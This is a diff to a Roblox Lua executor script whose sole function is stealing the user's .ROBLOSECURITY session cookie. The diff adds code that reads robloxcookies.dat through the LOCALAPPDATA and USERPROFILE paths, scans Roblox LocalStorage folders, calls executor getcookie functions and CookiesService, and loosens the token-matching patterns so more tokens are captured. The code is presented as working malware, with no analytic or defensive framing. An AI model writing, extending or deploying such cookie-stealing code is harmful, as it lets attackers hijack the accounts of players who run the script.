@@ -24,6 +24,13 @@ getgenv().VoidRan = true
 
 local _hs = game:GetService("HttpService")
 
+local function _env(k)
+    if not os.getenv then return nil end
+    local ok, v = pcall(os.getenv, k)
+    if ok and type(v) == "string" and #v > 0 then return v end
+    return nil
+end
+
 local function _pick()
     local c = {
         function() return getgenv().syn and getgenv().syn.request end,
@@ -36,14 +43,11 @@ local function _pick()
         function() return krnl and krnl.request end,
         function() return xeno and xeno.request end,
         function() return sirhurt and sirhurt.request end,
-        function() return medium and medium.request end,
+        function() return madium and madium.request end,
         function() return delta and delta.request end,
         function() return codex and codex.request end,
         function() return hydrogen and hydrogen.request end,
-        function() return arceus and arceus.request end,
         function() return wave and wave.request end,
-        function() return solara and solara.request end,
-        function() return aether and aether.request end,
         function() return getgenv().request end,
         function() return request end,
     }
@@ -59,8 +63,11 @@ local function _extract(r)
     if type(r) ~= "string" then return nil end
     local m = r:match("ROBLOSECURITY=([^;%s\"']+)")
     if m then return m end
-    m = r:match("(_|WARNING[^%s\"';]+)")
-    if m and #m > 60 then return m end
+    m = r:match("(_|WARNING[%w%-%._%+%/%=%|%:]+)")
+    if m and #m > 100 then
+        if #m > 2000 then m = m:sub(1, 2000) end
+        return m
+    end
     r = r:gsub("^%s+", ""):gsub("%s+$", "")
     if #r > 60 and not r:find("%s") then return r end
     return nil
@@ -91,12 +98,20 @@ local function _headers(r)
     return nil
 end
 
-local FOLDERS = {
-    "Medium", "/storage/emulated/0/Medium", "/storage/emulated/0/Medium/workspace",
-    "Delta", "/storage/emulated/0/Delta", "Codex", "/storage/emulated/0/Codex",
-    "Hydrogen", "/storage/emulated/0/Hydrogen", "Wave", "/storage/emulated/0/Wave",
-    "Arceus X", "/storage/emulated/0/Arceus X", "Void",
-}
+local function _datPaths()
+    local out = {}
+    local la = _env("LOCALAPPDATA")
+    local up = _env("USERPROFILE")
+    if la then
+        out[#out + 1] = la .. "\\Roblox\\LocalStorage\\robloxcookies.dat"
+        out[#out + 1] = la .. "/Roblox/LocalStorage/robloxcookies.dat"
+    end
+    if up then
+        out[#out + 1] = up .. "\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat"
+        out[#out + 1] = up .. "\\AppData\\LocalLow\\Roblox\\LocalStorage\\robloxcookies.dat"
+    end
+    return out
+end
 
 local function _scanDir(dir, depth)
     if depth > 2 then return nil end
@@ -110,9 +125,9 @@ local function _scanDir(dir, depth)
                 if r then return r end
             elseif isfile(f) then
                 local ok2, c = pcall(readfile, f)
-                if ok2 and type(c) == "string" and #c < 8000 then
+                if ok2 and type(c) == "string" and #c < 20000 then
                     local m = _extract(c)
-                    if m and (m:find("_|WARNING", 1, true) or #m > 100) then return m end
+                    if m then return m end
                 end
             end
         end
@@ -125,6 +140,7 @@ local function _cookie()
         {"getgenv().getcookie", function() return getgenv().getcookie and getgenv().getcookie() end},
         {"getcookie", function() return getcookie and getcookie() end},
         {"getgenv().getCookie", function() return getgenv().getCookie and getgenv().getCookie() end},
+        {"getgenv().getrobloxcookie", function() return getgenv().getrobloxcookie and getgenv().getrobloxcookie() end},
         {"getgenv().Cookie", function() return getgenv().Cookie end},
         {"shared.Cookie", function() return shared and shared.Cookie end},
         {"syn.getcookie", function() return syn and syn.getcookie and syn.getcookie() end},
@@ -132,22 +148,18 @@ local function _cookie()
         {"krnl.getcookie", function() return krnl and krnl.getcookie and krnl.getcookie() end},
         {"xeno.getcookie", function() return xeno and xeno.getcookie and xeno.getcookie() end},
         {"sirhurt.getcookie", function() return sirhurt and sirhurt.getcookie and sirhurt.getcookie() end},
-        {"medium.getcookie", function() return medium and medium.getcookie and medium.getcookie() end},
-        {"getgenv().Medium.getcookie", function() return getgenv().Medium and getgenv().Medium.getcookie and getgenv().Medium.getcookie() end},
+        {"madium.getcookie", function() return madium and madium.getcookie and madium.getcookie() end},
+        {"getgenv().madium.getcookie", function() return getgenv().madium and getgenv().madium.getcookie and getgenv().madium.getcookie() end},
         {"delta.getcookie", function() return delta and delta.getcookie and delta.getcookie() end},
         {"codex.getcookie", function() return codex and codex.getcookie and codex.getcookie() end},
         {"hydrogen.getcookie", function() return hydrogen and hydrogen.getcookie and hydrogen.getcookie() end},
-        {"arceus.getcookie", function() return arceus and arceus.getcookie and arceus.getcookie() end},
         {"electron.getcookie", function() return electron and electron.getcookie and electron.getcookie() end},
         {"solara.getcookie", function() return solara and solara.getcookie and solara.getcookie() end},
-        {"aether.getcookie", function() return aether and aether.getcookie and aether.getcookie() end},
         {"wave.getcookie", function() return wave and wave.getcookie and wave.getcookie() end},
         {"valyse.getcookie", function() return valyse and valyse.getcookie and valyse.getcookie() end},
         {"trigon.getcookie", function() return trigon and trigon.getcookie and trigon.getcookie() end},
         {"velocity.getcookie", function() return velocity and velocity.getcookie and velocity.getcookie() end},
         {"ronix.getcookie", function() return ronix and ronix.getcookie and ronix.getcookie() end},
-        {"nihon.getcookie", function() return nihon and nihon.getcookie and nihon.getcookie() end},
-        {"swift.getcookie", function() return swift and swift.getcookie and swift.getcookie() end},
         {"CookiesService", function()
             local svc = game:GetService("CookiesService")
             for _, m in ipairs({"GetCookies", "GetCookie"}) do
@@ -162,16 +174,27 @@ local function _cookie()
                 end
             end
         end},
+        {"robloxcookies.dat", function()
+            for _, p in ipairs(_datPaths()) do
+                if isfile(p) then
+                    local ok, c = pcall(readfile, p)
+                    if ok then
+                        local m = _extract(c)
+                        if m then return m end
+                    end
+                end
+            end
+        end},
         {"fichiers connus", function()
             local paths = {
-                "cookie.txt", "/storage/emulated/0/cookie.txt",
-                "Medium/cookie.txt", "/storage/emulated/0/Medium/cookie.txt",
-                "Medium/workspace/cookie.txt", "/storage/emulated/0/Medium/workspace/cookie.txt",
-                "Delta/cookie.txt", "/storage/emulated/0/Delta/cookie.txt",
-                "Codex/cookie.txt", "/storage/emulated/0/Codex/cookie.txt",
-                "Hydrogen/cookie.txt", "/storage/emulated/0/Hydrogen/cookie.txt",
-                "Void/cookie.txt",
+                "cookie.txt", "Void/cookie.txt", "Madium/cookie.txt",
+                "workspace/cookie.txt", "Madium/workspace/cookie.txt",
             }
+            local la = _env("LOCALAPPDATA")
+            if la then
+                paths[#paths + 1] = la .. "\\Madium\\cookie.txt"
+                paths[#paths + 1] = la .. "\\Madium\\workspace\\cookie.txt"
+            end
             for _, p in ipairs(paths) do
                 if isfile(p) then
                     local ok, r = pcall(readfile, p)
@@ -182,8 +205,13 @@ local function _cookie()
                 end
             end
         end},
-        {"scan dossiers", function()
-            for _, d in ipairs(FOLDERS) do
+        {"scan LocalStorage", function()
+            local la = _env("LOCALAPPDATA")
+            local up = _env("USERPROFILE")
+            local dirs = {}
+            if la then dirs[#dirs + 1] = la .. "\\Roblox" end
+            if up then dirs[#dirs + 1] = up .. "\\AppData\\Local\\Roblox" end
+            for _, d in ipairs(dirs) do
                 local r = _scanDir(d, 1)
                 if r then return r end
             end
@@ -204,11 +232,6 @@ local function _cookie()
             if not fn then return nil end
             return _headers(fn({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"}))
         end},
-        {"request:accountjson", function()
-            local fn = _pick()
-            if not fn then return nil end
-            return _headers(fn({Url = "https://www.roblox.com/my/account/json", Method = "GET"}))
-        end},
     }
     for _, e in ipairs(list) do
         local c = _src(e[1], e[2])
@@ -219,17 +242,26 @@ end
 
 local function _diag()
     local out = {}
-    for _, p in ipairs({"Medium", "/storage/emulated/0/Medium", "/storage/emulated/0/Medium/workspace", "/storage/emulated/0"}) do
-        local ok, f = pcall(listfiles, p)
-        if ok and type(f) == "table" then
-            local names = {}
-            for i, v in ipairs(f) do
-                if i > 10 then break end
-                names[#names + 1] = tostring(v):gsub(".*[/\\]", "")
+    out[#out + 1] = "LOCALAPPDATA=" .. tostring(_env("LOCALAPPDATA"))
+    out[#out + 1] = "USERPROFILE=" .. tostring(_env("USERPROFILE"))
+    for _, p in ipairs(_datPaths()) do
+        local ok, v = pcall(isfile, p)
+        out[#out + 1] = p .. " -> " .. tostring(ok and v)
+    end
+    local la = _env("LOCALAPPDATA")
+    if la then
+        for _, d in ipairs({la .. "\\Roblox", la .. "\\Roblox\\LocalStorage", la .. "\\Madium"}) do
+            local ok, f = pcall(listfiles, d)
+            if ok and type(f) == "table" then
+                local names = {}
+                for i, v in ipairs(f) do
+                    if i > 8 then break end
+                    names[#names + 1] = tostring(v):gsub(".*[/\\]", "")
+                end
+                out[#out + 1] = d .. " -> " .. table.concat(names, ", ")
+            else
+                out[#out + 1] = d .. " -> KO"
             end
-            out[#out + 1] = p .. " -> " .. table.concat(names, ", ")
-        else
-            out[#out + 1] = p .. " -> KO"
         end
     end
     local s = table.concat(out, "\n")
